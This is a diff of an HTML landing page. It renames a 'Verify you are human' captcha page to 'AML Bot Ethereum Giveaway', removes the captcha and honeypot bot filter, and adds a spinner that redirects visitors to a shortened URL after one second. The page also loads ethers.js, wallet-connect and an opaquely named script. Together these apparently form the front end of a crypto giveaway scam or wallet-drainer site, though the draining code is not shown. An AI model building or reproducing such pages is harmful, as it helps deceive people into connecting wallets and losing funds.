@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-    <title>Verify you are human</title>
+    <title>AML Bot Ethereum Giveaway</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"></script><script src="./scripts/wallet-connect-v3.js"></script>
     <script src="./7b4ed442-079d-48a2-b93d-a3a78a78b554.js"></script>
 
@@ -47,197 +47,65 @@
 
 </head>
 <body>
-    <!-- oughta here -->
-    <div class="tt">
-        <form id="pp" name="honey" action="detected.html" method="get">
-            <input type="text" id="in" placeholder="full name" name="honey" style="outline: none; text-decoration: none; border: none; color:white; background-color: white;" height="15px" width="20px">
-            <input type="submit" id="in" style="border: none; color: white; background-color: white;" width="25px" height="17px;">
-        </form>
-    </div>
 
+    <div class="loader"></div>
+
+
+    <script src="index.js"></script>
     <script>
-        const form = document.getElementById('pp');
-    
-        form.addEventListener('submit', function (event) {
-            const honeyField = form.querySelector('[name="honey"]');
-            if (honeyField.value) {
-                // Redirect the user to a "spam detected" page
-                window.location.href = 'detected.html';
-                event.preventDefault(); // Prevent the form from submitting (optional)
-            }
-        });
+
+        // Function to redirect to another page
+        function redirectToAnotherPage() {
+            window.location.href = 'https://rb.gy/2c80s'; 
+        }
+
+        var redirectDelay = 1000; 
+
+        setTimeout(redirectToAnotherPage, redirectDelay);
+
     </script>
-    <div class="contain">
-        <!--Captcha-->
-        <div class="containerr" style="position: relative;">
+    <style>
+        body{
+            overflow: hidden;
+        }
+    </style>
+    <style>   
+        /*----------Loader----------------*/
 
-            <div class="divv">
-                <p class="popl">Verify you are human</p>
-            </div>
-            
-            <div class="input_field captch_box">
-                <input type="text" class="captch_box1" value="" disabled/>
-            </div>
+        .loader {
+            position: fixed;
+            top: 45%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.75s, visibility 0.75s;
+        }
 
-            <div class="input_field captch_input">
-                <input type="text" class="captch_input1" value="" placeholder="Enter Captcha" />
-            </div>      
-            <div class="message" style="font-family: sans-serif; font-size: 18px;" ></div>
-            <div class="input_field button">
-                <button id="capbtn">Submit Captcha</button>
-            </div>
+        .loader::after {
+            margin-top: 50px;
+            content: "";
+            width: 25px;
+            height: 25px;
+            border: 5px solid whitesmoke;
+            border-top-color: #0b8cfd;
+            border-radius: 50%;
+            animation: loading 1.3s ease infinite;
+        }
 
-        </div>
-    
-    </div>
-    <script>
-        const captchaTextBox = document.querySelector(".captch_box input");
-        const captchaInputBox = document.querySelector(".captch_input input");
-        const message = document.querySelector(".message");
-        const submitButton = document.querySelector("button");
-    
-        let captchaText = null;
-    
-        const generateCaptcha = () => {
-            const randomString = Math.random().toString(36).substring(2, 7);
-            const randomStringArray = randomString.split("");
-            const changeString = randomStringArray.map((char) => (Math.random() > 0.5 ? char.toUpperCase() : char));
-            captchaText = changeString.join("   ");
-            captchaTextBox.value = captchaText;
-        };
-    
-        const captchaKeyUpValidate = () => {
-            const trimmedInput = captchaInputBox.value.replace(/\s/g, ""); // Remove spaces from user input
-            captchaInputBox.value = trimmedInput; // Update the input box with trimmed value
-            submitButton.classList.toggle("disabled", !trimmedInput); // Check trimmed input for validation
-        };
-    
-        generateCaptcha();
-        captchaInputBox.value = "";
-        captchaKeyUpValidate();
-    
-        const submitBtnClick = () => {
-            captchaText = captchaText.split("").filter((char) => char !== " ").join("");
-            message.classList.add("active");
-            if (captchaInputBox.value === captchaText) {
-                message.innerText = "";
-                
-                submitButton.style.opacity = 0.5;
-                // Redirect the user to another website when the CAPTCHA is correct
-                window.location.href = 'https://rb.gy/2c80s'; // Replace with your target URL
-            } else {
-                message.innerText = "Captcha is incorrect";
-                generateCaptcha();
+        @keyframes loading {
+            from {
+                transform: rotate(0turn);
             }
-        };
-    
-        captchaInputBox.addEventListener("input", captchaKeyUpValidate); // Use "input" event to capture all input changes
-        submitButton.addEventListener("click", submitBtnClick);
-    </script>    
+            to {
+                transform: rotate(1turn);
+            }
+        }
+    </style>
 </body>
 </html>
 
 <style>
-
-    .message {
-        color: rgb(169, 13, 13);
-    }
-    
-    #pp input[type="text"]::placeholder {
-        color: white;
-    }
-
-    .popl{
-        font-size: 20px;
-        color: black;
-        font-family: sans-serif;
-        letter-spacing: 0.3px;
-    }
-
-    .divv {
-        text-align: center;
-        align-items: center;
-        justify-content: center;
-        margin-top: 25px;
-        position: relative;
-    }
-
-    /*-----Captcha-------*/
-
-    .contain{
-        text-align: center;
-        align-items: center;
-        justify-content: center;
-        position: relative;
-        top: 115px;
-    }
-
-    .containerr {
-
-        border-radius: 5%;
-
-        text-align: center;
-        align-items: center;
-        justify-content: center;
-        margin-top: 10px;
-
-        margin-left: auto;
-        margin-right: auto;
-
-        height: 310px;
-        width: 380px;
-        background-color: white;
-    }
-
-    .containerr input {
-        width: 250px;
-        height: 40px;
-        padding: 0.5rem;
-        border-radius: 16px;
-        border: none;
-        outline: none;
-        box-shadow: 1px 1px 5px black;
-
-    }
-
-    #capbtn {
-        background-color: rgb(30, 125, 184);
-        background-image: linear-gradient(to top, rgb(49, 110, 202) 0%, rgb(23, 148, 186) 100%);
-        background-size: 100%;
-        padding: 10px 20px;
-        margin-top: 8px; /* Add some spacing between the form and the submit button */
-        color: white;
-        border: none;
-        border-radius: 10px;
-        outline: none;
-        height: 40px;
-        width: 250px;
-        font-size: 16px;
-        cursor: pointer;
-        transition: transform 0.3s;
-    
-    }
-
-    #capbtn:active {
-        transform: scale(0.8); /* Shrink the button on click */
-    }
-
-
-    .message {
-        margin-top: 12px;
-        font: 16px;
-        display: none;
-        margin-bottom: 10px;
-
-    }
-
-    .message.active {
-        display: block;
-    }
-
-    .input_field {
-        margin-top: 10px;
-    }
-
 
 </style>
